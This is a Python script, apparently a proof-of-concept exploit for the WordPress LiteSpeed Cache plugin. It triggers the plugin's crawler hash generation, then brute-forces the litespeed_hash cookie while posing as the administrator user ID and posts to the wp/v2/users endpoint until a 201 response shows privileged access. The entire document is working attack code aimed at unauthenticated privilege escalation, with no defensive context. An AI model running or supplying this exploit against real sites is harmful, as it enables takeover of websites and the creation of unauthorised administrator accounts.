import requests
import random
import string
import time

# Configuration
TARGET_SITE = "http://example.com"
ADMIN_USER_ID = 1
API_ENDPOINT = f"{TARGET_SITE}/wp-json/wp/v2/users"
HEADERS = {
    "Content-Type": "application/json"
}

def generate_random_string(length):
    """Generate a random string of fixed length."""
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))

def trigger_hash_generation():
    """Trigger the generation of the security hash."""
    trigger_url = f"{TARGET_SITE}/wp-admin/admin-ajax.php?action=async_litespeed&litespeed_type=crawler"
    response = requests.get(trigger_url)
    if response.status_code == 200:
        print("[*] Security hash generated.")
    else:
        print(f"[-] Failed to trigger hash generation: {response.status_code}")

def brute_force_hash():
    """Brute force the security hash."""
    cookies = {
        "litespeed_role": str(ADMIN_USER_ID),
        "litespeed_hash": ""  # Empty initially
    }

    for _ in range(1000000):  # Adjust the range as needed
        hash_candidate = generate_random_string(6)
        cookies["litespeed_hash"] = hash_candidate

        response = requests.post(API_ENDPOINT, cookies=cookies, headers=HEADERS)
        
        if response.status_code == 201:
            print(f"[+] Success: Valid hash found - {hash_candidate}")
            return hash_candidate
        elif response.status_code == 401:
            print(f"[-] Invalid hash: {hash_candidate}")
        
        # Sleep to avoid rapid-fire requests
        time.sleep(0.1)

    print("[-] Failed: No valid hash found after all attempts")
    return None

if __name__ == "__main__":
    print("[*] Triggering security hash generation...")
    trigger_hash_generation()
    print("[*] Starting brute-force attack...")
    valid_hash = brute_force_hash()
